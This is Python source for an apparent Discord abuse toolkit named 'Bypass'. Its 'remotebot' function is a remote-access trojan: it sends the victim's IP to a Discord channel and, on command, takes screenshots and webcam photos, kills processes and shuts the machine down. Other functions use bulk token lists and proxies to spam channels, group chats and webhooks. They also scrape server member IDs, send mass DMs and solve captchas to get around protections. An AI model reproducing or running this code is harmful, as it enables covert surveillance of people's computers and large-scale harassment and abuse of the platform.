__website__ = 'https://bypasstool.xyz' # © Bypass
__developers__ = 'BypassTool#5552'

##########################################################################################################################################
from data.addons.servcheck import *
from data.addons.req import *
from data.addons.updater import *
##########################################################################################################################################
bypass_name = 'Bypass'
bypass_version = 'x3.1'
lg = Fore.LIGHTGREEN_EX
w = Fore.WHITE         
rr = Fore.RED          
lb = Fore.LIGHTBLUE_EX 
b = Fore.BLUE  
####################################
def remotebot():
    from discord.ext import commands
    import discord
    from discord import Intents
    os.system('pip install pyautogui')
    import pyautogui
    os.system('pip install socket')
    import socket
    os.system('pip install webbrowser')
    import webbrowser
    os.system('pip install opencv-python')
    import cv2
    clear()

    b = Fore.BLUE
    TOKEN = input(f'{w}[{b}TOKEN{w}] Bot Token » ')
    CHANNEL_ID = input(f'{w}[{b}CHANNEL{w}] Channel ID » ')
    hostname = socket.gethostname()
    hostip = socket.gethostbyname(hostname)
    ip = requests.get('https://api.ipify.org').text 

    intents = discord.Intents.default()
    client = discord.Client(intents=Intents.all())
    @client.event
    async def on_ready():
        channel = client.get_channel(int(CHANNEL_ID))
        await channel.send(f'```[❤️] » New User Connected {hostip} / {ip}```')  

    clear()
    print(f'{w}[{b}+{w}] » Type "commands" for Help')

    @client.event
    async def on_message(message):
        if message.content.startswith('ip'):
            # replace this with whatever you want the bot to do
            await message.channel.send(f'```[✅] IP » {ip} // [🟩] Host IP » {hostip}```')  

        elif message.content.startswith('screen'):
            image = pyautogui.screenshot()
            image.save('screenshot.png')
            await message.channel.send(f'{hostip}')
            await message.channel.send(file=discord.File('screenshot.png'))
            os.remove('screenshot.png') 

        elif message.content.startswith('cmd'):
            os.system('cmd')    

        elif message.content.startswith('taskkill'):
            task_name = message.content.split(' ')[1] # Extract the task name from the message
            os.system(f'taskkill /f /im {task_name}.exe') # Kill the task with the specified name
            await message.channel.send(f'{task_name} has been killed. on {hostip}')     

        elif message.content.startswith('internet.open'):
            website = message.content.split(' ')[1]
            xx = f"https://{website}.com"
            webbrowser.open(f'{xx}')
            await message.channel.send(f'```[👌] » Started {xx} on {hostip}```')    

        elif message.content.startswith('face'):
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cv2.imwrite("face.jpg", frame)
            cap.release()
            await message.channel.send(f'{hostip}')
            with open("face.jpg", "rb") as f:
                file = discord.File(f)
                await message.channel.send(file=discord.File('face.jpg'))
            os.remove("face.jpg")   

        elif message.content.startswith('commands'):
            await message.channel.send(f'''```
ip » Gives Users IP and Hostip
screen » Makes a Screenshot of the Users Desktop
cmd » Opens CMD on Users PC
taskkill (task) » Ends The Task the User is running right now
internet.open (website name) » Opens a Website on Users PC
face » Shows Users Face
notepad » Opens Notepad on Users PC
users » gives all active Users
shutdown » shuts down Users PC```''')

        elif message.content.startswith('notepad'):
            await message.channel.send(f'```[✅] » Started Notepad on {hostip}```')
            os.system('notepad')    

        elif message.content.startswith('shutdown'):
            await message.channel.send(f'```[✅] Shutting Down {hostip}```')
            os.system("shutdown /s /t 1")

        elif message.content.startswith('users'):
            await message.channel.send(f'```[✅] {hostip} is active```')

    client.run(TOKEN)   

def randomstring(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

def raider():
    b = Fore.BLUE
    channel7 = Write.Input("[CHANNEL] Channel ID: ", culur, interval=0.000)
    mess7 = Write.Input("[MESSAGE] Message: ", culur, interval=0.000)
    delay7 = ("0")
    tokens = open("data/tokens.txt", "r").read().splitlines()
    proxies = open("data/proxies.txt", "r").read().splitlines()
    def spam(token, channel7, mess7):
        url = 'https://discord.com/api/v9/channels/'+channel7+'/messages'
        data = {"content": mess7}
        header = {"authorization": token}
        while True:
            time.sleep(0.0001)
            r = requests.post(url, data=data, headers=header, proxies=proxies)
            if r.status_code == 200:
                print(f'{w}[{lg}+{w}] » Successfully Sent Message > {mess7} on {token}')
            else:
                print(f"{w}[{rr}-{w}] » Couldn't Send Message on > {token} Code » {r.status_code}")
    def thread():
        channel_id = channel7
        text = mess7
        for token in tokens:
            time.sleep(int(delay7))
            threading.Thread(target=spam, args=(token, channel_id, text)).start()
    start = Write.Input("[>] Press ENTER to Start:", culur, interval=0.000)
    start = thread()
    start = thread()
    start = thread()
    start = thread()
    start = thread()
    start = thread()
    start = thread()
    start = thread()

def captchasolver(url, key):
    config = json.load("config.json")

    if config["captcha_Method"] == "Capmonster":
        capmonster = HCaptchaTask(config["api_key"])
        taskid = capmonster.create_task(url, key)
        result = capmonster.join_task_result(taskid)
        cresponse = result.get("gRecaptchaResponse")
        return cresponse
    
    elif config["captcha_Method"] == "Anticaptcha":
        anticap = hCaptchaProxyon()
        anticap.set_key(config["api_key"])
        anticap.set_website_url(url)
        anticap.set_website_key(key)
        gresponse = anticap.solve_and_return_solution()
        return gresponse

    elif config["captcha_Method"] == "Capsolver":
        capsolver = RecaptchaV2Task(config["api_key"])
        task_id = capsolver.create_task(url, key)
        result = capsolver.join_task_result(task_id)
        csresponse = result.get("gRecaptchaResponse")
        return csresponse
def mainHeader(token):
    return {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "de-DE",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={randomstring(43)}; __dcfduid={randomstring(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
def nickchanger():
    clear()
    def changenick(server, nickname, token):
            headers = mainHeader(token)

            r = requests.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                               json={"nick": nickname})
            if r.status_code == 200:
                print(f'{w}[{lg}+{w}] » Changed Nickname on {token}')
            if r.status_code != 200:
                print(f'{w}[{rr}-{w}] » Couldnt Change Nickname on {token}')
    tokens = open('data/tokens.txt', 'r').read().splitlines()
    server = Write.Input('[SERVERID] ID » ', culur, interval=0.000)
    nick = Write.Input('[NICKNAME] NICK » ', culur, interval=0.000)
    for token in tokens:
        threading.Thread(target=changenick, args=(server, nick, token)).start()
    time.sleep(1)
    input("")
    main()

def vcjoiner():
    from data.addons import vcjoiner

def clear():
    os.system("cls")
    return

def ch():
    def change_pfp():
        g = Fore.LIGHTGREEN_EX
        b = Fore.BLUE
        from os.path import isfile, join
        tokens = open('data/tokens.txt', 'r').read().splitlines()
        token = random.choice(tokens)

        picture = [f for f in os.listdir("data/Avatars/") if isfile(join("data/Avatars/", f))]
        random_picture = random.choice(picture)

        with open(f'data/Avatars/{random_picture}', "rb") as image_file:
            encoded_string = base64.b64encode(image_file.read())

        headers = {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en;q=0.9',
            'authorization': token,
            'cookie': '__dcfduid=904754d01e0f11edbc8e137cc7c473ca; __sdcfduid=904754d11e0f11edbc8e137cc7c473caaf269406fe90d738955d66c8929cd997a08c8669ef42a295aac84cc43230a150; __cf_bm=uXHYoYl9KmWotP8UeGBa6PejMQCeibzDkDYmf2MsY9s-1660728773-0-AS+XIQ7NNSyCZ4NlcXTdL0oVGueHXZdj2D0+lSifopWh7sUykquNKC/lA3UpNMqVrjBh728hF1wibQBsBEFv69LTkEam4T1CLerS8v2rjGVq0ZwVEPXbnDz7iPfEX8AvEA==; locale=en-GB',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/@me',
            'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwNC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA0LjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE0MjAwMCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        }

        json = {
            'avatar': f"data:image/png;base64,{(encoded_string.decode('utf-8'))}",
        }

        r = requests.patch('https://discord.com/api/v9/users/@me', headers=headers, json=json)
        if r.status_code == 200:
            print(f'{w}[{b}+{w}] » Changed Avatar on {token}')
        else:
            print(f'{w}[{rr}-{w}] » Error With {token}')

    b = Fore.BLUE
    clear()
    print(f'{w}[{b}!{w}] » Avatars Must be in data/Avatars/ as an PNG Image')
    threads = input(f'{w}[{b}+{w}] » Amout of Avatars to Change » ')
    for i in range(int(threads)):
        threading.Thread(target=change_pfp).start()

def setup():
    if os.path.exists("config.json"):
        with open("config.json", 'r') as x:
            global captcha_method, api_key, enable_proxy

            xx = json.load(x)

            captcha_method = xx["captcha_Method"]
            api_key = xx["api_key"]
            enable_proxy = xx["enable_proxy"]

            main()
    else:
        config = {
            "captcha_Method": "Capmonster, Capsolver, Anticaptcha",
            "api_key": "",
            "enable_proxy": "True/False"
        }

        with open("config.json", 'w') as xy:
            xy.write(config)

        print(Colorate.Horizontal(Colors.red_to_blue, f"[Config] » created :)"))

def leaver():
    clear()
    tokenx = open("data/tokens.txt", "r").read().splitlines()
    ID = Write.Input("[SERVER] Server ID » ", culur, interval=0.000)
    aplnk = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)
    with open('data/tokens.txt', 'r') as handle:
        tokens = handle.readlines()
        for i in tokens:
            tokenx = i.rstrip()
            headers = {
                'Authorization': tokenx,
                "content-length": "0",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            requests.delete(aplnk, headers=headers)
            time.sleep(1)
            main()

def tokensorter():
    for token in open("data/tokens.txt").read().splitlines():
        tknonly = token.split(":")[2]
        with open("output/tokens.txt", 'a')as finished:
            finished.write(tknonly + "\n")
    Write.Print('\nFinished.. Wrote into output/tokens.txt', culur, interval=0.0000)
    time.sleep(1)
    main()


def gcspam():
    clear()
    proxies = open('data/proxies.txt').readlines()
    b = Fore.LIGHTBLUE_EX
    token = input(f'{w}[{b}TOKEN{w}] Token » ')
    UserID = input(f'{w}[{b}USERID{w}] ID » ')
    group = input(f'{w}[{b}NAMES{w}] Groupname » ')
    manygr = int(input(f'{w}[{b}AMOUT{w}] How Much » '))
    headers = mainHeader(token)
    for i in range(manygr):
        try:
            r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                              json={"recipients": []})
            jsr = json.loads(r.content)
            groupID = jsr['id']
            time.sleep(0.5)
            r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                json={'name': group})
            if r1.status_code == 200:
                print(f'{w}[{b}+{w}] » Group Created ')
            with open("data/groups.txt", "w") as groupID:
                groupID.write(jsr['id'] + '\n')
        except:
            print(f'[{rr}-{Fore.RESET}] RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])
        scrIds = random.choice(open('data/groups.txt').readlines())
        grID = scrIds.strip('\n')
        r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                              headers = {'Authorization': f'{token}',
                                         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
                                         'Origin': 'discord.com',
                                         'Accept': '*/*',
                                         'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                                         'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'})
        if r2.status_code == 204:
            print(f'{w}[{b}+{w}] Group Members - {UserID}')
    time.sleep(1)
    os.remove('data/groups.txt')
    main()

def tokenyear():
    clear()
    Write.Print("\n[>] » Make Sure the Tokens are in email:password:token format", culur, interval=0.000)
    Write.Input("\nPress ENTER to Start", culur, interval=0.000)
    for token in open("data/tokens.txt").read().splitlines():
        only_token = token.split(":")[2]
        userid_base64 = only_token.split(".")[0] + "=="
        userid = base64.b64decode(userid_base64).decode("utf-8")
        usertmiestamp_binary = bin(int(userid))[:-22]
        creationdate_unix = int(usertmiestamp_binary, 2) + 1420070400000 
        year = datetime.datetime.fromtimestamp(creationdate_unix/1000).strftime('%Y') 
        with open("output/" + year + ".txt", 'a') as f:
            f.write(token + "\n")
        print(f"{userid_base64} - {year}")
    Write.Input("\nFinished..  Wrote into output/year.txt",culur, interval=0.000)
    main()

def botmassdm():
    clear()
    ttttuk = Write.Input('[TOKEN] Bot Token » ',culur, interval=0.0030)
    status = Write.Input('[STATUS] Bot Status » ',culur, interval=0.0030)
    Message = Write.Input('[MESSAGE] Msg » ',culur, interval=0.0030)
    Dly = Write.Input('[DELAY] Delay » ',culur, interval=0.0030)
    act = discord.Game(name=f"{status}")
    intents = discord.Intents.all()
    client = commands.Bot(command_prefix='$', intents=intents, activity=act, status=discord.Status.do_not_disturb)

    @client.event
    async def on_ready():
        clear()
        Write.Print('[INFO] » Say $massdm in the Server to DM ALL\n',culur, interval=0.000)
        time.sleep(0.001)

    @client.command()
    async def massdm(ctx):
            msg = (f"{Message}")
            members = ctx.guild.members
            for member in members:
                try:
                    time.sleep(int(Dly))
                    print(f'{Fore.GREEN}[+]{Fore.RESET} Direct Message Sent To {member}')
                    await member.send(msg)
                except:
                    print(f'{Fore.RED}[-]{Fore.RESET} Cant Send Direct Message {member}\n')
    
    @client.command()
    async def s(ctx):
        await ctx.send(f"{len(client.guilds)}")
        


    client.run(f'{ttttuk}')


def webhookoptions():
    def webhookdeleter():
        clear()
        b = Fore.LIGHTBLUE_EX
        wbh = input(f'{w}[{b}WEBHOOK{w}] » ')
        x = requests.delete(wbh)
        if x.status_code == 200:
            print(f'{w}[{rr}-{w}] » Couldnt Delete Webhook {x.status_code}')
        else:
            print(f'{w}[{b}+{w}] » Deleted Webhook')
        input()
        main()
    def webhookchecker():
        b = Fore.LIGHTBLUE_EX
        wbh = input(f'{w}[{b}WEBHOOK{w}] » ')
        xx = requests.get(wbh)
        if xx.status_code == 200:
            print(f'{w}[{lg}+{w}] » Webhook Exists')
        if xx.status_code == 204:
            print(f'{w}[{lg}+{w}] » Webhook Exists')
        else:
            print(f'{w}[{rr}-{w}] » Webhook Doesnt Exists')
        main()
    def webhookspammer():
        os.system('pip install dhooks')
        clear()
        import dhooks
        from dhooks import Webhook
        b = Fore.LIGHTBLUE_EX
        wbh1 = input(f'{w}[{b}WEBHOOK{w}] » ')
        wbh = Webhook(wbh1)
        msg = input(f'{w}[{b}+{w}] MSG » ')
        while True:
            wbh.send(msg)
            print(f'{w}[{b}+{w}] » Sent MSG: {msg}')
    def webhookchecker1():
        clear()
        from dhooks import Webhook
        wbhk = Webhook(input(f"{w}[{b}+{w}] » Put your webhook: "))
        wbhk.get_info()
        print("\n")
        print(f"{w}[{b}+{w}] » Guild ID: {wbhk.guild_id}")
        print(f"{w}[{b}+{w}] » Channel ID: {wbhk.channel_id}")
        print(f"{w}[{b}+{w}] » Username: {wbhk.default_name}")
        print(f"{w}[{b}+{w}] » Image Link: {wbhk.default_avatar_url}")
        input("")
        main()
    clear()
    b = Fore.BLUE
    xxx = input(f'''{b}
[01] » Webhook Deleter
[02] » Webhook Checker
[03] » Webhook Spammer
[04] » Webhook Full Info
    
[•] Choose » ''')
    if xxx == "1":
        webhookdeleter()
    if xxx == "2":
        webhookchecker()
    if xxx == "3":
        webhookspammer()
    if xxx == "4":
        webhookchecker1()
    else:
        main()

def proxyfetcher():
    clear()
    proxylist = ['https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
'https://raw.githubusercontent.com/BlackSnowDot/proxylist-update-every-minute/main/https.txt',
'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
'https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt']
    choosenproxy = random.choice(proxylist)
    prxy = requests.get(choosenproxy)
    with open('data/proxies.txt', 'w')as f:
        f.write(prxy.text)
    i = open("data/proxies.txt").readlines()
    print(f'{w}[{lg}+{w}] » Fetched - {len(i)} Proxies..')
    time.sleep(2)
    main()

def activity():
    b = Fore.BLUE
    clear()
    print(f'{w}[{b}!{w}] » Tokens Must be in data/tokens.txt')
    def activity(token, act1):
        ws = websocket.WebSocket()
        actt = 'Idle'
        ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
        gjs = {'name': act1,
               'type': 0}
        auth = {'op': 2,
                'd': {'token': token,
                      'properties': {'$os': sys.platform,
                                     '$browser': 'RTB',
                                     '$device': f"{sys.platform} Device"},
                      'presence': {'game': gjs,
                                   'status': actt,
                                   'since': 0,
                                   'afk': False}},
                's': None,
                't': None}
        ws.send(json.dumps(auth))
        print(f'[{b}+{Fore.RESET}] Playing {act1} on {token}')

    tokens = open('data/tokens.txt', 'r').read().splitlines()
    text = input(f'{w}[{b}+{w}] » Activity Status » ')
    for token in tokens:
        threading.Thread(target=activity, args=(token, text)).start()
    time.sleep(3)
    input(f'{w}[{lg}+{w}] » Press Enter to go back!')
    main()

def idscraper():
    b = Fore.BLUE
    os.system('pip install discum')
    import discum
    clear()
    tukan = input(f'{w}[{b}TOKEN{w}] TKN » ')
    guildd = input(f'{w}[{b}SERVERID{w}] ID » ')
    chann = input(f'{w}[{b}CHANNELID{w}] ID » ')
    bot = discum.Client(token=tukan)

    def closefetching(resp,guildid):
     if bot.gateway.finishedMemberFetching(guildid):
        lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
        print(str(lenmembersfetched))
        bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
        bot.gateway.close()

    def getmembers(guildid,channelid):
         bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
         bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
         bot.gateway.run()
         bot.gateway.resetSession()
         return bot.gateway.session.guild(guildid).members

    members = getmembers(guildd, chann)
    memberids = []

    for memberId in members:
        memberids.append(memberId)

    clear()

    with open('data/member_ids.txt','w') as ids:
        for element in memberids:
            ids.write(element + '\n')    

    print(f'{w}[{b}+{w}] Scraped {len(memberids)} Members')
    time.sleep(1)
    main()


def botvcjoiner():
    os.system('pip install pynacl')
    clear()
    TOKEN = Write.Input('[TOKEN] TKN » ', culur, interval=0.000)
    GUILD_ID = Write.Input('[GUILD] ID » ', culur, interval=0.000)
    CHANNEL_ID = Write.Input('[CHANNEL] ID » ', culur, interval=0.000)
    intents = discord.Intents.default()
    intents.voice_states = True

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print('Logged in as {0.user}'.format(client))
        try:
            guild = client.get_guild(int(GUILD_ID))
            if guild is None:
                print(f'Failed to find guild with ID {GUILD_ID}')
                return
            voice_channel = discord.utils.get(guild.voice_channels, id=int(CHANNEL_ID))
            if voice_channel:
                await voice_channel.connect()
                print('Joined voice channel successfully!')
            else:
                print('Voice channel not found.')
        except Exception as e:
            print(f'Error in on_ready: {e}')
    client.run(TOKEN)

def onliner():
    clear()
    config = {
        "details": "Get it Here 🔽",
        "state": "https://shrtco.de/by",
        "name": f"Bypass • {bypass_version}",
    }

    class Onliner:
        def __init__(self, token) -> None:
            self.token    = token
            self.statuses = ["online", "idle", "dnd"]

        def __online__(self):
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
            response = ws.recv()
            event = json.loads(response)
            heartbeat_interval = int(event["d"]["heartbeat_interval"]) / 1000
            ws.send(
                json.dumps(
                    {
                        "op": 2,
                        "d": {
                            "token": self.token,
                            "properties": {
                                "$os": sys.platform,
                                "$browser": "RTB",
                                "$device": f"{sys.platform} Device",
                            },
                            "presence": {
                                "game": {
                                    "name": config["name"],
                                    "type": 0,
                                    "details": config["details"],
                                    "state": config["state"],
                                },
                                "status": random.choice(self.statuses),
                                "since": 0,
                                "activities": [],
                                "afk": False,
                            },
                        },
                        "s": None,
                    "t": None,
                    }
                )
            )
            b = Fore.BLUE
            print(f"{lb}[ONLINE{lb}]{w} Token ~/> {lb}{self.token}{w} is online.")

            while True:
                heartbeatJSON = {
                    "op": 1, 
                    "token": self.token, 
                    "d": "null"
                }
                ws.send(json.dumps(heartbeatJSON))
                time.sleep(heartbeat_interval)

    for token in open("data/tokens.txt", "r").read().splitlines():
        threading.Thread(target=Onliner(token).__online__).start()
    time.sleep(4)
    Write.Input(f"~/> Press ENTER to go Back!", culur, interval=0.000)
    main()

def SlowPrint(_str):
    from time import sleep
    for letter in _str:
        sys.stdout.write(letter);sys.stdout.flush();sleep(0.04)

def about():
    clear()
    b = Fore.BLUE
    SlowPrint(f'{w}[{b}ABOUT{w}] » About Bypass and The Tool')
    print("")
    SlowPrint(f'''{w}[{b}>{w}] » Bypass Is a Discord Tool that was made for fun and with <3 by BYASS! if you have any suggestions or problems feel free to contact me:
         
{w}[{b}DISCORD{w}] • BYASS#9266''')
    input(f'\n{w}[{b}EXIT{w}] Press ENTER to go back!')
    main()

def patchnotes():
    clear()
    b = Fore.BLUE
    SlowPrint(f'{w}[{b}NOTES{w}] » Patch Notes of Bypass {bypass_version}:')
    print("")
    print("")
    print(f'{w}[{b}!{w}] » No Patchnotes rn, everything is working fine!')
    input(f'{w}[{b}EXIT{w}] Press ENTER to go back!')
    main()

def add_emoji(token, channel_id, message_id, emoji):
    """Adds an emoji to a message for a given token."""
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me'
    headers = {
        'Authorization': f'{token}'
    }
    response = requests.put(url, headers=headers)
    if response.status_code == 204:
        print(f'{w}[{b}SUCCESS{w}] » Added Emoji on - {token}')
    else:
        print(f'{w}[{rr}FAILED{w}] » Couldnt Add Emoji on - {token}')

def reactionspammer():
    clear()
    emoji = input(f'{w}[{b}EMOJI{w}] In The Windows Emoji Version » ') 
    channel_id = input(f'{w}[{b}CHANNEL{w}] ID » ') 
    message_id = input(f'{w}[{b}MESSAGE{w}] ID » ')
    with open('data/tokens.txt', 'r') as f:
        tokens = [line.strip() for line in f]   
    threads = []
    for token in tokens:
        thread = threading.Thread(target=add_emoji, args=(token, channel_id, message_id, emoji))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()



clear()
b = Fore.BLUE
x = "data/color.txt"
if os.path.exists(x):
    with open('data/color.txt', 'r')as file:
        for line in file:
            if "Colors.blue_to_white" in line:
                culur = Colors.blue_to_white
            if "Colors.green_to_white" in line:
                culur = Colors.green_to_white
            if "Colors.blue_to_purple" in line:
                culur = Colors.blue_to_purple
            if "Colors.blue_to_green" in line:
                culur = Colors.blue_to_green
            if "Colors.blue_to_cyan" in line:
                culur = Colors.blue_to_cyan
else:
    SlowPrint(f'{w}[{b}>{w}] » Here are the avabile Themes You can Choose // You can Change them anytime: ')
    Write.Print(f'\n\n[01] // » This is Blue Text', Colors.blue_to_white, interval=0.000)
    Write.Print(f'\n[02] // » This is Green Text', Colors.green_to_white, interval=0.000)
    Write.Print(f'\n[03] // » This is Purple Text', Colors.blue_to_purple, interval=0.000)
    Write.Print(f'\n[04] // » This is Blue / Green Text', Colors.blue_to_green, interval=0.000)
    Write.Print(f'\n[05] // » This is Cyan / Blue Text', Colors.blue_to_cyan, interval=0.000)
    cs = input(f'\n\n{w}[{b}>{w}] Choice » ')
    if cs == "1":
        culur = Colors.blue_to_white
        with open('data/color.txt', 'w')as color:
            color.write('Colors.blue_to_white')

    if cs == "2":
        culur = Colors.green_to_white   
        with open('data/color.txt', 'w')as color:
            color.write('Colors.green_to_white')

    if cs == "3":
        culur = Colors.blue_to_purple 
        with open('data/color.txt', 'w')as color:
            color.write('Colors.blue_to_purple')
        
    if cs == "4":
        culur = Colors.blue_to_green
        with open('data/color.txt', 'w')as color:
            color.write('Colors.blue_to_green')

    if cs == "5":
        culur = Colors.blue_to_cyan
        with open('data/color.txt', 'w')as color:
            color.write('Colors.blue_to_cyan')

def themechanger():
    clear()
    SlowPrint(f'{w}[{b}>{w}] » Here are the avabile Themes You can Choose: ')
    Write.Print(f'\n\n[01] // » This is Blue Text', Colors.blue_to_white, interval=0.000)
    Write.Print(f'\n[02] // » This is Green Text', Colors.green_to_white, interval=0.000)
    Write.Print(f'\n[03] // » This is Purple Text', Colors.blue_to_purple, interval=0.000)
    Write.Print(f'\n[04] // » This is Blue / Green Text', Colors.blue_to_green, interval=0.000)
    Write.Print(f'\n[05] // » This is Cyan / Blue Text', Colors.blue_to_cyan, interval=0.000)
    xxxx = input(f'\n\n{w}[{b}>{w}] Choice » ')
    if xxxx == "1":
        os.remove('data/color.txt')
        with open('data/color.txt', 'w') as color:
            color.write('Colors.blue_to_white')
        print(f'{w}[{b}!{w}] » Restarting The Tool...')
        time.sleep(1.5)
        exit()
    if xxxx == "2":
        os.remove('data/color.txt')
        with open('data/color.txt', 'w') as color:
            color.write('Colors.green_to_white')  
        print(f'{w}[{b}!{w}] » Restarting The Tool...')
        time.sleep(1.5)
        exit()  
    if xxxx == "3":
        os.remove('data/color.txt')
        with open('data/color.txt', 'w') as color:
            color.write('Colors.blue_to_purple')  
        print(f'{w}[{b}!{w}] » Restarting The Tool...')
        time.sleep(1.5)
        exit()
    if xxxx == "4":
        os.remove('data/color.txt')
        with open('data/color.txt', 'w') as color:
            color.write('Colors.blue_to_green')  
        print(f'{w}[{b}!{w}] » Restarting The Tool...')
        time.sleep(1.5) 
        exit()  
    if xxxx == "5":
        os.remove('data/color.txt')  
        with open('data/color.txt', 'w') as color:
            color.write('Colors.blue_to_cyan')  
        print(f'{w}[{b}!{w}] » Restarting The Tool...')
